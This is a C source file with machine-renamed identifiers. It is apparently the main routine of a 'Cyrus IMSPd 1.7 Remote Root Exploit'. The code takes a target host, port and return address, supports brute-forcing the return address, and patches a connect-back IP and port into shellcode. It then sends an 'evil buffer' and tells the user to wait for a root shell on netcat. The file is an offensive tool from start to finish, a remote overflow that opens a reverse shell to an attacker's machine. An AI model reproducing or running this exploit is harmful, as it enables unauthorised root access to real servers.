
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_2__ TYPE_1__ ;


struct TYPE_2__ {scalar_t__ Name; int Retaddr; } ;


 int VAR_0 ;
 int FUNC_0 (char*,int) ;
 char* FUNC_1 (int) ;
 int VAR_1 ;
 int VAR_2 ;
 char VAR_3 ;
 int FUNC_2 (int) ;
 int* VAR_4 ;

 TYPE_1__* VAR_5 ;
 int FUNC_3 (char*) ;
 int FUNC_4 (char*) ;
 int FUNC_5 (int) ;
 int FUNC_6 (char*,char*,char*,char*,char*,char*,char*,char*,char*,char*,char*,int ) ;
 int FUNC_7 (char*) ;
 int FUNC_8 (int ,char*,...) ;
 int FUNC_9 (char*) ;
 char FUNC_10 (int,char**,char*) ;
 unsigned short FUNC_11 (unsigned short) ;
 int FUNC_12 (int,char*,int ,int ) ;
 int FUNC_13 (int) ;
 int FUNC_14 (char*,char*,int) ;
 int FUNC_15 (char*,char*,int*,...) ;
 int VAR_6 ;
 int FUNC_16 (char*) ;

int FUNC_17(int VAR_7, char **VAR_8)
{
 extern char *VAR_9;
 extern int VAR_10;
  char VAR_11;
  char *VAR_12 = ((void*)0);
  int VAR_13 = VAR_1;
  int VAR_14 = 0;
  int VAR_15 = VAR_2;
  int VAR_16 = 0;
  int VAR_17,VAR_18,VAR_19;
  char *VAR_20;
  int VAR_21 = 0;
  char VAR_22[20];
  int VAR_23 = 0,VAR_24 = 0,VAR_25 = 0,VAR_26 = 0;
  char *VAR_27,*VAR_28;
  unsigned short *VAR_29 = (unsigned short *)(VAR_4+39);

 FUNC_8(VAR_6,"\n==[ Cyrus IMSPd 1.7 Remote Root Exploit ]==\n\n");


 while ( (VAR_11 = FUNC_10(VAR_7,VAR_8,"h:t:p:ba:r:i:")) != VAR_3)
 {
  switch(VAR_11)
  {
   case 'i':
    if( FUNC_15(VAR_9,"%d.%d.%d.%d" ,&VAR_26,&VAR_25,&VAR_24,&VAR_23) != 4)
     FUNC_3(VAR_8[0]);
    VAR_27 = VAR_9;
   break;
   case 'r':
    VAR_21 = FUNC_4(VAR_9);
    if(!VAR_21) FUNC_3(VAR_8[0]);
    VAR_28 = VAR_9;
   break;
   case 'h':
    VAR_12 = VAR_9;
   break;
   case 'p':
    VAR_13 = FUNC_4(VAR_9);
    if(!VAR_13) FUNC_3(VAR_8[0]);
   break;
   case 'b':
    if(VAR_14 == 0)
     VAR_14 = VAR_0;
    else
     FUNC_3(VAR_8[0]);
   break;
   case 'a':
    if( FUNC_15(VAR_9,"0x%lx",&VAR_15) != 1)
     FUNC_3(VAR_8[0]);
   break;
   case 't':
    VAR_16 = FUNC_4(VAR_9);
    if(VAR_14 == 0)
     VAR_14 = 128;
    else
     FUNC_3(VAR_8[0]);
   break;
   default: FUNC_3(VAR_8[0]);
   break;
  }
 }
 if(VAR_12 == ((void*)0) || VAR_14 == 0) FUNC_3(VAR_8[0]);
 if(VAR_21 == 0) FUNC_3(VAR_8[0]);
 if(VAR_23 ==0 || VAR_24 == 0 || VAR_25 == 0 || VAR_26 == 0) FUNC_3(VAR_8[0]);


 for(VAR_19=0;;VAR_19++)
  if(VAR_5[VAR_19].Name == 0) break;
 if(--VAR_19<VAR_16) FUNC_3(VAR_8[0]);


 VAR_4[33] = VAR_26;
 VAR_4[34] = VAR_25;
 VAR_4[35] = VAR_24;
 VAR_4[36] = VAR_23;
 *VAR_29 = FUNC_11((unsigned short)VAR_21);

 if(VAR_14 == 128)
  FUNC_8(VAR_6,"*** Target plataform      : %ld\n",VAR_5[VAR_16].Name);
 FUNC_8(VAR_6,"*** Target host           : %s\n",VAR_12);
 FUNC_8(VAR_6,"*** Target port           : %u\n",VAR_13);
 FUNC_8(VAR_6,"*** IP to connect back    : %u.%u.%u.%u\n" ,VAR_26,VAR_25,VAR_24,VAR_23);
 FUNC_8(VAR_6,"*** Port to connect back  : %u\n",VAR_21);

 if(VAR_14 == 128)
  FUNC_8(VAR_6,"*** Target RET            : %#010x\n\n",VAR_5[VAR_16].Retaddr);
 else
  FUNC_8(VAR_6,"*** Bruteforce mode start : %#010x\n\n",VAR_15);

 switch(VAR_14)
 {
  case 128:
   VAR_17 = FUNC_0(VAR_12,VAR_13);
   if(VAR_17 == -1) FUNC_7("Could not connect");
   else FUNC_8(VAR_6,"[+] Connected\n");

   FUNC_8(VAR_6,"[+] Creating evil buffer\n");
   VAR_20 = FUNC_1(VAR_5[VAR_16].Retaddr);

   FUNC_8(VAR_6,"[+] Sending evil buffer\n");

   FUNC_12(VAR_17,VAR_20,FUNC_16(VAR_20),0);
   FUNC_13(1);

   FUNC_8(VAR_6,"[+] Wait for root shell on your netcat\n\n");
  break;
  default:
   for(;;)
   {
    FUNC_8(VAR_6,"[+] Using RetAddr = %#010x\n",VAR_15);

    VAR_17 = FUNC_0(VAR_12,VAR_13);
    if(VAR_17 == -1)
    {

     FUNC_8(VAR_6,"[-] Error. Restarting ...\n\n");
     FUNC_13(1);
     FUNC_14(VAR_22,"%#010x",VAR_15);
     FUNC_6(VAR_8[0],VAR_8[0],"-h",VAR_12,"-b","-a",VAR_22,"-i",VAR_27,"-r",VAR_28,0);
    }
    else
    {
     FUNC_8(VAR_6,"[+] Connected\n");

     FUNC_8(VAR_6,"[+] Creating evil buffer\n");
     VAR_20 = FUNC_1(VAR_15);

     FUNC_8(VAR_6,"[+] Sending evil buffer\n");
     FUNC_12(VAR_17,VAR_20,FUNC_16(VAR_20),0);

     FUNC_13(1);
     FUNC_5(VAR_17);
     FUNC_9(VAR_20);
     FUNC_8(VAR_6,"\n");

     VAR_15 = FUNC_2(VAR_15);
    }
   }
  break;
 }

 FUNC_9(VAR_20);
 FUNC_5(VAR_17);
}
